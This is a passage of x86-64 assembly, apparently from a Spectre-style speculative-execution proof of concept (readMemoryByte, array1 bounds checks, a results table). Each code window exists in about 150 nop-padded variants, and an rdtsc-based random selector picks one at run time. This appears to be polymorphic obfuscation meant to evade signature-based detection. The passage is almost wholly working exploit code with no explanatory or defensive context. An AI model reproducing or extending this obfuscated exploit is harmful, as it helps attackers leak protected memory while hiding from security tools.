	movl	%eax, -140(%rbp)    # # 4-byte Spill
	nop
	movl	-52(%rbp), %eax
	nop
	xorl	%edx, %edx
	divl	_array1_size(%rip)
	jmp	.LreadMemoryByte_win4_continue
## Variant 107
.LreadMemoryByte_win4_var107:
	popq	%rax
	cmpl	-20(%rbp), %eax
	jg	LBB1_23
## %bb.21:                              ##   in Loop: Header=BB1_19 Depth=2
	movl	-68(%rbp), %eax
	nop
	movl	%eax, -140(%rbp)    # # 4-byte Spill
	movl	-52(%rbp), %eax
	xorl	%edx, %edx
	divl	_array1_size(%rip)
	nop
	jmp	.LreadMemoryByte_win4_continue
## Variant 108
.LreadMemoryByte_win4_var108:
	popq	%rax
	cmpl	-20(%rbp), %eax
	nop
	nop
	jg	LBB1_23
## %bb.21:                              ##   in Loop: Header=BB1_19 Depth=2
	movl	-68(%rbp), %eax
	nop
	movl	%eax, -140(%rbp)    # # 4-byte Spill
	movl	-52(%rbp), %eax
	xorl	%edx, %edx
	divl	_array1_size(%rip)
	jmp	.LreadMemoryByte_win4_continue
## Variant 109
.LreadMemoryByte_win4_var109:
	popq	%rax
	cmpl	-20(%rbp), %eax
	jg	LBB1_23
## %bb.21:                              ##   in Loop: Header=BB1_19 Depth=2
	movl	-68(%rbp), %eax
	movl	%eax, -140(%rbp)    # # 4-byte Spill
	nop
	movl	-52(%rbp), %eax
	xorl	%edx, %edx
	nop
	divl	_array1_size(%rip)
	jmp	.LreadMemoryByte_win4_continue
## Variant 110
.LreadMemoryByte_win4_var110:
	popq	%rax
	cmpl	-20(%rbp), %eax
	nop
	jg	LBB1_23
	nop
	nop
## %bb.21:                              ##   in Loop: Header=BB1_19 Depth=2
	movl	-68(%rbp), %eax
	movl	%eax, -140(%rbp)    # # 4-byte Spill
	movl	-52(%rbp), %eax
	xorl	%edx, %edx
	divl	_array1_size(%rip)
	jmp	.LreadMemoryByte_win4_continue
## Variant 111
.LreadMemoryByte_win4_var111:
	popq	%rax
	cmpl	-20(%rbp), %eax
	jg	LBB1_23
## %bb.21:                              ##   in Loop: Header=BB1_19 Depth=2
	nop
	movl	-68(%rbp), %eax
	movl	%eax, -140(%rbp)    # # 4-byte Spill
	movl	-52(%rbp), %eax
	nop
	xorl	%edx, %edx
	nop
	divl	_array1_size(%rip)
	jmp	.LreadMemoryByte_win4_continue
## Variant 112
.LreadMemoryByte_win4_var112:
	popq	%rax
	cmpl	-20(%rbp), %eax
	jg	LBB1_23
## %bb.21:                              ##   in Loop: Header=BB1_19 Depth=2
	movl	-68(%rbp), %eax
	movl	%eax, -140(%rbp)    # # 4-byte Spill
	movl	-52(%rbp), %eax
	xorl	%edx, %edx
	nop
	divl	_array1_size(%rip)
	jmp	.LreadMemoryByte_win4_continue
## Variant 113
.LreadMemoryByte_win4_var113:
	popq	%rax
	cmpl	-20(%rbp), %eax
	nop
	jg	LBB1_23
## %bb.21:                              ##   in Loop: Header=BB1_19 Depth=2
	movl	-68(%rbp), %eax
	movl	%eax, -140(%rbp)    # # 4-byte Spill
	movl	-52(%rbp), %eax
	xorl	%edx, %edx
	divl	_array1_size(%rip)
	jmp	.LreadMemoryByte_win4_continue
## Variant 114
.LreadMemoryByte_win4_var114:
	popq	%rax
	cmpl	-20(%rbp), %eax
	nop
	jg	LBB1_23
## %bb.21:                              ##   in Loop: Header=BB1_19 Depth=2
	movl	-68(%rbp), %eax
	movl	%eax, -140(%rbp)    # # 4-byte Spill
	nop
	nop
	movl	-52(%rbp), %eax
	xorl	%edx, %edx
	divl	_array1_size(%rip)
	jmp	.LreadMemoryByte_win4_continue
## Variant 115
.LreadMemoryByte_win4_var115:
	popq	%rax
	cmpl	-20(%rbp), %eax
	nop
	jg	LBB1_23
## %bb.21:                              ##   in Loop: Header=BB1_19 Depth=2
	movl	-68(%rbp), %eax
	movl	%eax, -140(%rbp)    # # 4-byte Spill
	nop
	movl	-52(%rbp), %eax
	xorl	%edx, %edx
	divl	_array1_size(%rip)
	jmp	.LreadMemoryByte_win4_continue
## Variant 116
.LreadMemoryByte_win4_var116:
	popq	%rax
	cmpl	-20(%rbp), %eax
	nop
	jg	LBB1_23
## %bb.21:                              ##   in Loop: Header=BB1_19 Depth=2
	movl	-68(%rbp), %eax
	nop
	movl	%eax, -140(%rbp)    # # 4-byte Spill
	movl	-52(%rbp), %eax
	xorl	%edx, %edx
	divl	_array1_size(%rip)
	jmp	.LreadMemoryByte_win4_continue
## Variant 117
.LreadMemoryByte_win4_var117:
	popq	%rax
	nop
	cmpl	-20(%rbp), %eax
	jg	LBB1_23
## %bb.21:                              ##   in Loop: Header=BB1_19 Depth=2
	movl	-68(%rbp), %eax
	movl	%eax, -140(%rbp)    # # 4-byte Spill
	movl	-52(%rbp), %eax
	nop
	xorl	%edx, %edx
	divl	_array1_size(%rip)
	nop
	jmp	.LreadMemoryByte_win4_continue
## Variant 118
.LreadMemoryByte_win4_var118:
	popq	%rax
	nop
	cmpl	-20(%rbp), %eax
	jg	LBB1_23
## %bb.21:                              ##   in Loop: Header=BB1_19 Depth=2
	movl	-68(%rbp), %eax
	movl	%eax, -140(%rbp)    # # 4-byte Spill
	movl	-52(%rbp), %eax
	xorl	%edx, %edx
	divl	_array1_size(%rip)
	jmp	.LreadMemoryByte_win4_continue
## Variant 119
.LreadMemoryByte_win4_var119:
	popq	%rax
	nop
	cmpl	-20(%rbp), %eax
	jg	LBB1_23
## %bb.21:                              ##   in Loop: Header=BB1_19 Depth=2
	movl	-68(%rbp), %eax
	movl	%eax, -140(%rbp)    # # 4-byte Spill
	movl	-52(%rbp), %eax
	xorl	%edx, %edx
	divl	_array1_size(%rip)
	jmp	.LreadMemoryByte_win4_continue
## Variant 120
.LreadMemoryByte_win4_var120:
	popq	%rax
	cmpl	-20(%rbp), %eax
	jg	LBB1_23
	nop
## %bb.21:                              ##   in Loop: Header=BB1_19 Depth=2
	movl	-68(%rbp), %eax
	movl	%eax, -140(%rbp)    # # 4-byte Spill
	movl	-52(%rbp), %eax
	xorl	%edx, %edx
	nop
	divl	_array1_size(%rip)
	nop
	jmp	.LreadMemoryByte_win4_continue
## Variant 121
.LreadMemoryByte_win4_var121:
	popq	%rax
	cmpl	-20(%rbp), %eax
	jg	LBB1_23
## %bb.21:                              ##   in Loop: Header=BB1_19 Depth=2
	movl	-68(%rbp), %eax
	nop
	movl	%eax, -140(%rbp)    # # 4-byte Spill
	movl	-52(%rbp), %eax
	nop
	xorl	%edx, %edx
	divl	_array1_size(%rip)
	jmp	.LreadMemoryByte_win4_continue
## Variant 122
.LreadMemoryByte_win4_var122:
	popq	%rax
	cmpl	-20(%rbp), %eax
	jg	LBB1_23
## %bb.21:                              ##   in Loop: Header=BB1_19 Depth=2
	movl	-68(%rbp), %eax
	nop
	nop
	movl	%eax, -140(%rbp)    # # 4-byte Spill
	movl	-52(%rbp), %eax
	xorl	%edx, %edx
	divl	_array1_size(%rip)
	jmp	.LreadMemoryByte_win4_continue
## Variant 123
.LreadMemoryByte_win4_var123:
	popq	%rax
	cmpl	-20(%rbp), %eax
	jg	LBB1_23
## %bb.21:                              ##   in Loop: Header=BB1_19 Depth=2
	movl	-68(%rbp), %eax
	nop
	movl	%eax, -140(%rbp)    # # 4-byte Spill
	movl	-52(%rbp), %eax
	xorl	%edx, %edx
	divl	_array1_size(%rip)
	nop
	jmp	.LreadMemoryByte_win4_continue
## Variant 124
.LreadMemoryByte_win4_var124:
	popq	%rax
	cmpl	-20(%rbp), %eax
	nop
	nop
	jg	LBB1_23
## %bb.21:                              ##   in Loop: Header=BB1_19 Depth=2
	movl	-68(%rbp), %eax
	movl	%eax, -140(%rbp)    # # 4-byte Spill
	movl	-52(%rbp), %eax
	xorl	%edx, %edx
	divl	_array1_size(%rip)
	nop
	jmp	.LreadMemoryByte_win4_continue
## Variant 125
.LreadMemoryByte_win4_var125:
	popq	%rax
	cmpl	-20(%rbp), %eax
	jg	LBB1_23
## %bb.21:                              ##   in Loop: Header=BB1_19 Depth=2
	movl	-68(%rbp), %eax
	nop
	movl	%eax, -140(%rbp)    # # 4-byte Spill
	nop
	movl	-52(%rbp), %eax
	xorl	%edx, %edx
	divl	_array1_size(%rip)
	jmp	.LreadMemoryByte_win4_continue
## Variant 126
.LreadMemoryByte_win4_var126:
	popq	%rax
	cmpl	-20(%rbp), %eax
	jg	LBB1_23
## %bb.21:                              ##   in Loop: Header=BB1_19 Depth=2
	movl	-68(%rbp), %eax
	movl	%eax, -140(%rbp)    # # 4-byte Spill
	nop
	movl	-52(%rbp), %eax
	xorl	%edx, %edx
	divl	_array1_size(%rip)
	jmp	.LreadMemoryByte_win4_continue
## Variant 127
.LreadMemoryByte_win4_var127:
	popq	%rax
	nop
	cmpl	-20(%rbp), %eax
	jg	LBB1_23
## %bb.21:                              ##   in Loop: Header=BB1_19 Depth=2
	movl	-68(%rbp), %eax
	movl	%eax, -140(%rbp)    # # 4-byte Spill
	movl	-52(%rbp), %eax
	xorl	%edx, %edx
	divl	_array1_size(%rip)
	jmp	.LreadMemoryByte_win4_continue
## Variant 128
.LreadMemoryByte_win4_var128:
	popq	%rax
	cmpl	-20(%rbp), %eax
	jg	LBB1_23
## %bb.21:                              ##   in Loop: Header=BB1_19 Depth=2
	movl	-68(%rbp), %eax
	movl	%eax, -140(%rbp)    # # 4-byte Spill
	movl	-52(%rbp), %eax
	nop
	xorl	%edx, %edx
	divl	_array1_size(%rip)
	nop
	jmp	.LreadMemoryByte_win4_continue
## Variant 129
.LreadMemoryByte_win4_var129:
	popq	%rax
	cmpl	-20(%rbp), %eax
	jg	LBB1_23
## %bb.21:                              ##   in Loop: Header=BB1_19 Depth=2
	movl	-68(%rbp), %eax
	movl	%eax, -140(%rbp)    # # 4-byte Spill
	movl	-52(%rbp), %eax
	xorl	%edx, %edx
	divl	_array1_size(%rip)
	nop
	jmp	.LreadMemoryByte_win4_continue
## Variant 130
.LreadMemoryByte_win4_var130:
	popq	%rax
	cmpl	-20(%rbp), %eax
	nop
	jg	LBB1_23
## %bb.21:                              ##   in Loop: Header=BB1_19 Depth=2
	movl	-68(%rbp), %eax
	movl	%eax, -140(%rbp)    # # 4-byte Spill
	movl	-52(%rbp), %eax
	xorl	%edx, %edx
	divl	_array1_size(%rip)
	jmp	.LreadMemoryByte_win4_continue
## Variant 131
.LreadMemoryByte_win4_var131:
	popq	%rax
	cmpl	-20(%rbp), %eax
	jg	LBB1_23
## %bb.21:                              ##   in Loop: Header=BB1_19 Depth=2
	movl	-68(%rbp), %eax
	nop
	nop
	movl	%eax, -140(%rbp)    # # 4-byte Spill
	nop
	movl	-52(%rbp), %eax
	xorl	%edx, %edx
	divl	_array1_size(%rip)
	jmp	.LreadMemoryByte_win4_continue
## Variant 132
.LreadMemoryByte_win4_var132:
	popq	%rax
	nop
	cmpl	-20(%rbp), %eax
	jg	LBB1_23
## %bb.21:                              ##   in Loop: Header=BB1_19 Depth=2
	movl	-68(%rbp), %eax
	movl	%eax, -140(%rbp)    # # 4-byte Spill
	movl	-52(%rbp), %eax
	nop
	xorl	%edx, %edx
	divl	_array1_size(%rip)
	jmp	.LreadMemoryByte_win4_continue
## Variant 133
.LreadMemoryByte_win4_var133:
	popq	%rax
	cmpl	-20(%rbp), %eax
	nop
	nop
	nop
	jg	LBB1_23
## %bb.21:                              ##   in Loop: Header=BB1_19 Depth=2
	movl	-68(%rbp), %eax
	movl	%eax, -140(%rbp)    # # 4-byte Spill
	movl	-52(%rbp), %eax
	xorl	%edx, %edx
	divl	_array1_size(%rip)
	jmp	.LreadMemoryByte_win4_continue
## Variant 134
.LreadMemoryByte_win4_var134:
	popq	%rax
	cmpl	-20(%rbp), %eax
	nop
	jg	LBB1_23
## %bb.21:                              ##   in Loop: Header=BB1_19 Depth=2
	movl	-68(%rbp), %eax
	movl	%eax, -140(%rbp)    # # 4-byte Spill
	movl	-52(%rbp), %eax
	xorl	%edx, %edx
	nop
	nop
	divl	_array1_size(%rip)
	jmp	.LreadMemoryByte_win4_continue
## Variant 135
.LreadMemoryByte_win4_var135:
	popq	%rax
	cmpl	-20(%rbp), %eax
	nop
	jg	LBB1_23
## %bb.21:                              ##   in Loop: Header=BB1_19 Depth=2
	movl	-68(%rbp), %eax
	movl	%eax, -140(%rbp)    # # 4-byte Spill
	movl	-52(%rbp), %eax
	xorl	%edx, %edx
	divl	_array1_size(%rip)
	jmp	.LreadMemoryByte_win4_continue
## Variant 136
.LreadMemoryByte_win4_var136:
	popq	%rax
	cmpl	-20(%rbp), %eax
	nop
	jg	LBB1_23
	nop
## %bb.21:                              ##   in Loop: Header=BB1_19 Depth=2
	movl	-68(%rbp), %eax
	movl	%eax, -140(%rbp)    # # 4-byte Spill
	movl	-52(%rbp), %eax
	xorl	%edx, %edx
	nop
	divl	_array1_size(%rip)
	jmp	.LreadMemoryByte_win4_continue
## Variant 137
.LreadMemoryByte_win4_var137:
	popq	%rax
	cmpl	-20(%rbp), %eax
	nop
	nop
	jg	LBB1_23
## %bb.21:                              ##   in Loop: Header=BB1_19 Depth=2
	movl	-68(%rbp), %eax
	movl	%eax, -140(%rbp)    # # 4-byte Spill
	movl	-52(%rbp), %eax
	xorl	%edx, %edx
	divl	_array1_size(%rip)
	nop
	jmp	.LreadMemoryByte_win4_continue
## Variant 138
.LreadMemoryByte_win4_var138:
	popq	%rax
	cmpl	-20(%rbp), %eax
	jg	LBB1_23
## %bb.21:                              ##   in Loop: Header=BB1_19 Depth=2
	movl	-68(%rbp), %eax
	movl	%eax, -140(%rbp)    # # 4-byte Spill
	movl	-52(%rbp), %eax
	xorl	%edx, %edx
	nop
	divl	_array1_size(%rip)
	nop
	jmp	.LreadMemoryByte_win4_continue
## Variant 139
.LreadMemoryByte_win4_var139:
	popq	%rax
	cmpl	-20(%rbp), %eax
	nop
	jg	LBB1_23
## %bb.21:                              ##   in Loop: Header=BB1_19 Depth=2
	movl	-68(%rbp), %eax
	movl	%eax, -140(%rbp)    # # 4-byte Spill
	movl	-52(%rbp), %eax
	nop
	xorl	%edx, %edx
	divl	_array1_size(%rip)
	nop
	jmp	.LreadMemoryByte_win4_continue
## Variant 140
.LreadMemoryByte_win4_var140:
	popq	%rax
	cmpl	-20(%rbp), %eax
	nop
	jg	LBB1_23
## %bb.21:                              ##   in Loop: Header=BB1_19 Depth=2
	nop
	movl	-68(%rbp), %eax
	movl	%eax, -140(%rbp)    # # 4-byte Spill
	movl	-52(%rbp), %eax
	xorl	%edx, %edx
	divl	_array1_size(%rip)
	jmp	.LreadMemoryByte_win4_continue
## Variant 141
.LreadMemoryByte_win4_var141:
	popq	%rax
	cmpl	-20(%rbp), %eax
	jg	LBB1_23
## %bb.21:                              ##   in Loop: Header=BB1_19 Depth=2
	movl	-68(%rbp), %eax
	movl	%eax, -140(%rbp)    # # 4-byte Spill
	nop
	nop
	movl	-52(%rbp), %eax
	xorl	%edx, %edx
	nop
	divl	_array1_size(%rip)
	jmp	.LreadMemoryByte_win4_continue
## Variant 142
.LreadMemoryByte_win4_var142:
	popq	%rax
	cmpl	-20(%rbp), %eax
	nop
	jg	LBB1_23
## %bb.21:                              ##   in Loop: Header=BB1_19 Depth=2
	movl	-68(%rbp), %eax
	movl	%eax, -140(%rbp)    # # 4-byte Spill
	movl	-52(%rbp), %eax
	xorl	%edx, %edx
	divl	_array1_size(%rip)
	nop
	nop
	jmp	.LreadMemoryByte_win4_continue
## Variant 143
.LreadMemoryByte_win4_var143:
	popq	%rax
	cmpl	-20(%rbp), %eax
	jg	LBB1_23
## %bb.21:                              ##   in Loop: Header=BB1_19 Depth=2
	nop
	nop
	movl	-68(%rbp), %eax
	nop
	movl	%eax, -140(%rbp)    # # 4-byte Spill
	movl	-52(%rbp), %eax
	xorl	%edx, %edx
	divl	_array1_size(%rip)
	jmp	.LreadMemoryByte_win4_continue
## Variant 144
.LreadMemoryByte_win4_var144:
	popq	%rax
	cmpl	-20(%rbp), %eax
	jg	LBB1_23
## %bb.21:                              ##   in Loop: Header=BB1_19 Depth=2
	movl	-68(%rbp), %eax
	nop
	movl	%eax, -140(%rbp)    # # 4-byte Spill
	movl	-52(%rbp), %eax
	xorl	%edx, %edx
	divl	_array1_size(%rip)
	jmp	.LreadMemoryByte_win4_continue
## Variant 145
.LreadMemoryByte_win4_var145:
	popq	%rax
	cmpl	-20(%rbp), %eax
	jg	LBB1_23
## %bb.21:                              ##   in Loop: Header=BB1_19 Depth=2
	movl	-68(%rbp), %eax
	movl	%eax, -140(%rbp)    # # 4-byte Spill
	nop
	movl	-52(%rbp), %eax
	xorl	%edx, %edx
	nop
	divl	_array1_size(%rip)
	jmp	.LreadMemoryByte_win4_continue
## Variant 146
.LreadMemoryByte_win4_var146:
	popq	%rax
	cmpl	-20(%rbp), %eax
	jg	LBB1_23
## %bb.21:                              ##   in Loop: Header=BB1_19 Depth=2
	movl	-68(%rbp), %eax
	movl	%eax, -140(%rbp)    # # 4-byte Spill
	nop
	movl	-52(%rbp), %eax
	xorl	%edx, %edx
	divl	_array1_size(%rip)
	jmp	.LreadMemoryByte_win4_continue
## Variant 147
.LreadMemoryByte_win4_var147:
	popq	%rax
	cmpl	-20(%rbp), %eax
	jg	LBB1_23
## %bb.21:                              ##   in Loop: Header=BB1_19 Depth=2
	movl	-68(%rbp), %eax
	movl	%eax, -140(%rbp)    # # 4-byte Spill
	movl	-52(%rbp), %eax
	xorl	%edx, %edx
	divl	_array1_size(%rip)
	nop
	jmp	.LreadMemoryByte_win4_continue
## Variant 148
.LreadMemoryByte_win4_var148:
	popq	%rax
	nop
	nop
	cmpl	-20(%rbp), %eax
	jg	LBB1_23
## %bb.21:                              ##   in Loop: Header=BB1_19 Depth=2
	movl	-68(%rbp), %eax
	movl	%eax, -140(%rbp)    # # 4-byte Spill
	movl	-52(%rbp), %eax
	xorl	%edx, %edx
	divl	_array1_size(%rip)
	jmp	.LreadMemoryByte_win4_continue
## Variant 149
.LreadMemoryByte_win4_var149:
	popq	%rax
	cmpl	-20(%rbp), %eax
	jg	LBB1_23
## %bb.21:                              ##   in Loop: Header=BB1_19 Depth=2
	movl	-68(%rbp), %eax
	movl	%eax, -140(%rbp)    # # 4-byte Spill
	movl	-52(%rbp), %eax
	xorl	%edx, %edx
	divl	_array1_size(%rip)
	nop
	jmp	.LreadMemoryByte_win4_continue
.LreadMemoryByte_win4_continue:
	movl	-140(%rbp), %eax    # # 4-byte Reload
	movl	%edx, %ecx
	movl	%ecx, %edx
	leaq	_array1(%rip), %rcx
	movzbl	(%rcx,%rdx), %ecx
## Start of variant dynamic selector
	pushq	%rax
	pushq	%rcx
	pushq	%rdx
	rdtsc
	xorq	%rdx, %rax
	movl	$150, %ecx
	xorl	%edx, %edx
	divl	%ecx
	movl	%edx, %eax
	popq	%rdx
	popq	%rcx
	cmpl	$0, %eax
	je	.LreadMemoryByte_win3_var0
	cmpl	$1, %eax
	je	.LreadMemoryByte_win3_var1
	cmpl	$2, %eax
	je	.LreadMemoryByte_win3_var2
	cmpl	$3, %eax
	je	.LreadMemoryByte_win3_var3
	cmpl	$4, %eax
	je	.LreadMemoryByte_win3_var4
	cmpl	$5, %eax
	je	.LreadMemoryByte_win3_var5
	cmpl	$6, %eax
	je	.LreadMemoryByte_win3_var6
	cmpl	$7, %eax
	je	.LreadMemoryByte_win3_var7
	cmpl	$8, %eax
	je	.LreadMemoryByte_win3_var8
	cmpl	$9, %eax
	je	.LreadMemoryByte_win3_var9
	cmpl	$10, %eax
	je	.LreadMemoryByte_win3_var10
	cmpl	$11, %eax
	je	.LreadMemoryByte_win3_var11
	cmpl	$12, %eax
	je	.LreadMemoryByte_win3_var12
	cmpl	$13, %eax
	je	.LreadMemoryByte_win3_var13
	cmpl	$14, %eax
	je	.LreadMemoryByte_win3_var14
	cmpl	$15, %eax
	je	.LreadMemoryByte_win3_var15
	cmpl	$16, %eax
	je	.LreadMemoryByte_win3_var16
	cmpl	$17, %eax
	je	.LreadMemoryByte_win3_var17
	cmpl	$18, %eax
	je	.LreadMemoryByte_win3_var18
	cmpl	$19, %eax
	je	.LreadMemoryByte_win3_var19
	cmpl	$20, %eax
	je	.LreadMemoryByte_win3_var20
	cmpl	$21, %eax
	je	.LreadMemoryByte_win3_var21
	cmpl	$22, %eax
	je	.LreadMemoryByte_win3_var22
	cmpl	$23, %eax
	je	.LreadMemoryByte_win3_var23
	cmpl	$24, %eax
	je	.LreadMemoryByte_win3_var24
	cmpl	$25, %eax
	je	.LreadMemoryByte_win3_var25
	cmpl	$26, %eax
	je	.LreadMemoryByte_win3_var26
	cmpl	$27, %eax
	je	.LreadMemoryByte_win3_var27
	cmpl	$28, %eax
	je	.LreadMemoryByte_win3_var28
	cmpl	$29, %eax
	je	.LreadMemoryByte_win3_var29
	cmpl	$30, %eax
	je	.LreadMemoryByte_win3_var30
	cmpl	$31, %eax
	je	.LreadMemoryByte_win3_var31
	cmpl	$32, %eax
	je	.LreadMemoryByte_win3_var32
	cmpl	$33, %eax
	je	.LreadMemoryByte_win3_var33
	cmpl	$34, %eax
	je	.LreadMemoryByte_win3_var34
	cmpl	$35, %eax
	je	.LreadMemoryByte_win3_var35
	cmpl	$36, %eax
	je	.LreadMemoryByte_win3_var36
	cmpl	$37, %eax
	je	.LreadMemoryByte_win3_var37
	cmpl	$38, %eax
	je	.LreadMemoryByte_win3_var38
	cmpl	$39, %eax
	je	.LreadMemoryByte_win3_var39
	cmpl	$40, %eax
	je	.LreadMemoryByte_win3_var40
	cmpl	$41, %eax
	je	.LreadMemoryByte_win3_var41
	cmpl	$42, %eax
	je	.LreadMemoryByte_win3_var42
	cmpl	$43, %eax
	je	.LreadMemoryByte_win3_var43
	cmpl	$44, %eax
	je	.LreadMemoryByte_win3_var44
	cmpl	$45, %eax
	je	.LreadMemoryByte_win3_var45
	cmpl	$46, %eax
	je	.LreadMemoryByte_win3_var46
	cmpl	$47, %eax
	je	.LreadMemoryByte_win3_var47
	cmpl	$48, %eax
	je	.LreadMemoryByte_win3_var48
	cmpl	$49, %eax
	je	.LreadMemoryByte_win3_var49
	cmpl	$50, %eax
	je	.LreadMemoryByte_win3_var50
	cmpl	$51, %eax
	je	.LreadMemoryByte_win3_var51
	cmpl	$52, %eax
	je	.LreadMemoryByte_win3_var52
	cmpl	$53, %eax
	je	.LreadMemoryByte_win3_var53
	cmpl	$54, %eax
	je	.LreadMemoryByte_win3_var54
	cmpl	$55, %eax
	je	.LreadMemoryByte_win3_var55
	cmpl	$56, %eax
	je	.LreadMemoryByte_win3_var56
	cmpl	$57, %eax
	je	.LreadMemoryByte_win3_var57
	cmpl	$58, %eax
	je	.LreadMemoryByte_win3_var58
	cmpl	$59, %eax
	je	.LreadMemoryByte_win3_var59
	cmpl	$60, %eax
	je	.LreadMemoryByte_win3_var60
	cmpl	$61, %eax
	je	.LreadMemoryByte_win3_var61
	cmpl	$62, %eax
	je	.LreadMemoryByte_win3_var62
	cmpl	$63, %eax
	je	.LreadMemoryByte_win3_var63
	cmpl	$64, %eax
	je	.LreadMemoryByte_win3_var64
	cmpl	$65, %eax
	je	.LreadMemoryByte_win3_var65
	cmpl	$66, %eax
	je	.LreadMemoryByte_win3_var66
	cmpl	$67, %eax
	je	.LreadMemoryByte_win3_var67
	cmpl	$68, %eax
	je	.LreadMemoryByte_win3_var68
	cmpl	$69, %eax
	je	.LreadMemoryByte_win3_var69
	cmpl	$70, %eax
	je	.LreadMemoryByte_win3_var70
	cmpl	$71, %eax
	je	.LreadMemoryByte_win3_var71
	cmpl	$72, %eax
	je	.LreadMemoryByte_win3_var72
	cmpl	$73, %eax
	je	.LreadMemoryByte_win3_var73
	cmpl	$74, %eax
	je	.LreadMemoryByte_win3_var74
	cmpl	$75, %eax
	je	.LreadMemoryByte_win3_var75
	cmpl	$76, %eax
	je	.LreadMemoryByte_win3_var76
	cmpl	$77, %eax
	je	.LreadMemoryByte_win3_var77
	cmpl	$78, %eax
	je	.LreadMemoryByte_win3_var78
	cmpl	$79, %eax
	je	.LreadMemoryByte_win3_var79
	cmpl	$80, %eax
	je	.LreadMemoryByte_win3_var80
	cmpl	$81, %eax
	je	.LreadMemoryByte_win3_var81
	cmpl	$82, %eax
	je	.LreadMemoryByte_win3_var82
	cmpl	$83, %eax
	je	.LreadMemoryByte_win3_var83
	cmpl	$84, %eax
	je	.LreadMemoryByte_win3_var84
	cmpl	$85, %eax
	je	.LreadMemoryByte_win3_var85
	cmpl	$86, %eax
	je	.LreadMemoryByte_win3_var86
	cmpl	$87, %eax
	je	.LreadMemoryByte_win3_var87
	cmpl	$88, %eax
	je	.LreadMemoryByte_win3_var88
	cmpl	$89, %eax
	je	.LreadMemoryByte_win3_var89
	cmpl	$90, %eax
	je	.LreadMemoryByte_win3_var90
	cmpl	$91, %eax
	je	.LreadMemoryByte_win3_var91
	cmpl	$92, %eax
	je	.LreadMemoryByte_win3_var92
	cmpl	$93, %eax
	je	.LreadMemoryByte_win3_var93
	cmpl	$94, %eax
	je	.LreadMemoryByte_win3_var94
	cmpl	$95, %eax
	je	.LreadMemoryByte_win3_var95
	cmpl	$96, %eax
	je	.LreadMemoryByte_win3_var96
	cmpl	$97, %eax
	je	.LreadMemoryByte_win3_var97
	cmpl	$98, %eax
	je	.LreadMemoryByte_win3_var98
	cmpl	$99, %eax
	je	.LreadMemoryByte_win3_var99
	cmpl	$100, %eax
	je	.LreadMemoryByte_win3_var100
	cmpl	$101, %eax
	je	.LreadMemoryByte_win3_var101
	cmpl	$102, %eax
	je	.LreadMemoryByte_win3_var102
	cmpl	$103, %eax
	je	.LreadMemoryByte_win3_var103
	cmpl	$104, %eax
	je	.LreadMemoryByte_win3_var104
	cmpl	$105, %eax
	je	.LreadMemoryByte_win3_var105
	cmpl	$106, %eax
	je	.LreadMemoryByte_win3_var106
	cmpl	$107, %eax
	je	.LreadMemoryByte_win3_var107
	cmpl	$108, %eax
	je	.LreadMemoryByte_win3_var108
	cmpl	$109, %eax
	je	.LreadMemoryByte_win3_var109
	cmpl	$110, %eax
	je	.LreadMemoryByte_win3_var110
	cmpl	$111, %eax
	je	.LreadMemoryByte_win3_var111
	cmpl	$112, %eax
	je	.LreadMemoryByte_win3_var112
	cmpl	$113, %eax
	je	.LreadMemoryByte_win3_var113
	cmpl	$114, %eax
	je	.LreadMemoryByte_win3_var114
	cmpl	$115, %eax
	je	.LreadMemoryByte_win3_var115
	cmpl	$116, %eax
	je	.LreadMemoryByte_win3_var116
	cmpl	$117, %eax
	je	.LreadMemoryByte_win3_var117
	cmpl	$118, %eax
	je	.LreadMemoryByte_win3_var118
	cmpl	$119, %eax
	je	.LreadMemoryByte_win3_var119
	cmpl	$120, %eax
	je	.LreadMemoryByte_win3_var120
	cmpl	$121, %eax
	je	.LreadMemoryByte_win3_var121
	cmpl	$122, %eax
	je	.LreadMemoryByte_win3_var122
	cmpl	$123, %eax
	je	.LreadMemoryByte_win3_var123
	cmpl	$124, %eax
	je	.LreadMemoryByte_win3_var124
	cmpl	$125, %eax
	je	.LreadMemoryByte_win3_var125
	cmpl	$126, %eax
	je	.LreadMemoryByte_win3_var126
	cmpl	$127, %eax
	je	.LreadMemoryByte_win3_var127
	cmpl	$128, %eax
	je	.LreadMemoryByte_win3_var128
	cmpl	$129, %eax
	je	.LreadMemoryByte_win3_var129
	cmpl	$130, %eax
	je	.LreadMemoryByte_win3_var130
	cmpl	$131, %eax
	je	.LreadMemoryByte_win3_var131
	cmpl	$132, %eax
	je	.LreadMemoryByte_win3_var132
	cmpl	$133, %eax
	je	.LreadMemoryByte_win3_var133
	cmpl	$134, %eax
	je	.LreadMemoryByte_win3_var134
	cmpl	$135, %eax
	je	.LreadMemoryByte_win3_var135
	cmpl	$136, %eax
	je	.LreadMemoryByte_win3_var136
	cmpl	$137, %eax
	je	.LreadMemoryByte_win3_var137
	cmpl	$138, %eax
	je	.LreadMemoryByte_win3_var138
	cmpl	$139, %eax
	je	.LreadMemoryByte_win3_var139
	cmpl	$140, %eax
	je	.LreadMemoryByte_win3_var140
	cmpl	$141, %eax
	je	.LreadMemoryByte_win3_var141
	cmpl	$142, %eax
	je	.LreadMemoryByte_win3_var142
	cmpl	$143, %eax
	je	.LreadMemoryByte_win3_var143
	cmpl	$144, %eax
	je	.LreadMemoryByte_win3_var144
	cmpl	$145, %eax
	je	.LreadMemoryByte_win3_var145
	cmpl	$146, %eax
	je	.LreadMemoryByte_win3_var146
	cmpl	$147, %eax
	je	.LreadMemoryByte_win3_var147
	cmpl	$148, %eax
	je	.LreadMemoryByte_win3_var148
	cmpl	$149, %eax
	je	.LreadMemoryByte_win3_var149
	jmp	.LreadMemoryByte_win3_var0
## Variant 0
.LreadMemoryByte_win3_var0:
	popq	%rax
	cmpl	%ecx, %eax
	je	LBB1_23
## %bb.22:                              ##   in Loop: Header=BB1_19 Depth=2
	movslq	-68(%rbp), %rcx
	leaq	_readMemoryByte.results(%rip), %rax
	movl	(%rax,%rcx,4), %edx
	addl	$1, %edx
	leaq	_readMemoryByte.results(%rip), %rax
	jmp	.LreadMemoryByte_win3_continue
## Variant 1
.LreadMemoryByte_win3_var1:
	popq	%rax
	cmpl	%ecx, %eax
	je	LBB1_23
## %bb.22:                              ##   in Loop: Header=BB1_19 Depth=2
	nop
	movslq	-68(%rbp), %rcx
	leaq	_readMemoryByte.results(%rip), %rax
	movl	(%rax,%rcx,4), %edx
	addl	$1, %edx
	leaq	_readMemoryByte.results(%rip), %rax
	jmp	.LreadMemoryByte_win3_continue
## Variant 2
.LreadMemoryByte_win3_var2:
	popq	%rax
	cmpl	%ecx, %eax
	je	LBB1_23
	nop
## %bb.22:                              ##   in Loop: Header=BB1_19 Depth=2
	movslq	-68(%rbp), %rcx
	leaq	_readMemoryByte.results(%rip), %rax
